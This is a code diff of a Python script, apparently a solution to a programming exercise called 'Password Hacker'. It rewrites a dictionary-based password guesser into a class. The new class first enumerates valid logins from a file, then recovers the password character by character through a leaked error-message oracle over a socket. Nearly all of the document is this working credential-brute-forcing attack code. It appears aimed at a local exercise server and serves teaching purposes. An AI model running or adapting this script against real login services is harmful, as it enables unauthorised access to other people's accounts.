@@ -1,31 +1,53 @@
 import socket
 import sys
 import itertools
-import string
+import json
 import os
+import string
 
 
-def hack_password(address, port):
-    my_socket = socket.socket()
-    my_socket.connect((address, port))
-    os.chdir('/Users/liudawei/Desktop/Password Hacker/Password Hacker/task/hacking')
-    with open('passwords.txt', 'r') as password_file:
-        for line in password_file:
-            letters = list(zip(list(line.strip().lower()), list(line.strip().upper())))
-            passwords = itertools.product(*letters)
-            for password in passwords:
-                msg = "".join(password)
-                my_socket.send(msg.encode())
-                response = my_socket.recv(1024)
-                if response.decode() == "Connection success!":
-                    my_socket.close()
-                    return msg
-                if response.decode() == "Too many attempts":
-                    my_socket.close()
-                    return "Too many attempts"
+class Hack:
+    def __init__(self, address, port):
+        self.my_socket = socket.socket()
+        self.my_socket.connect((address, port))
+        self.login = ''
+        self.password = ''
+
+    def hack_login(self):
+        os.chdir('/Users/liudawei/Desktop/Password Hacker/Password Hacker/task/hacking')
+        with open('logins.txt', 'r') as login_file:
+            for line in login_file:
+                login_json = json.dumps({'login': line.strip(), 'password': ''})
+                self.my_socket.send(login_json.encode())
+                login_response = self.my_socket.recv(1024)
+                login_msg = json.loads(login_response.decode())
+                # print(login_msg)
+                if login_msg['result'] == 'Wrong password!':
+                    self.login = line.strip()
+                    break
+
+    def hack_password(self):
+        password_elements = list(string.digits + string.ascii_letters)
+        while True:
+            for element in password_elements:
+                password_cur = self.password
+                password_cur += element
+                password_json = json.dumps({'login': self.login, 'password': password_cur})
+                self.my_socket.send(password_json.encode())
+                password_response = self.my_socket.recv(1024)
+                password_msg = json.loads(password_response.decode())
+                # print(password_msg)
+                if password_msg['result'] == 'Exception happened during login':
+                    self.password = password_cur
+                    break
+                if password_msg['result'] == 'Connection success!':
+                    self.password = password_cur
+                    return password_cur
 
 
-result = hack_password(sys.argv[1], int(sys.argv[2]))
-
+hacker = Hack(sys.argv[1], int(sys.argv[2]))
+hacker.hack_login()
+hacker.hack_password()
+result = json.dumps({"login": hacker.login, "password": hacker.password})
 print(result)
 
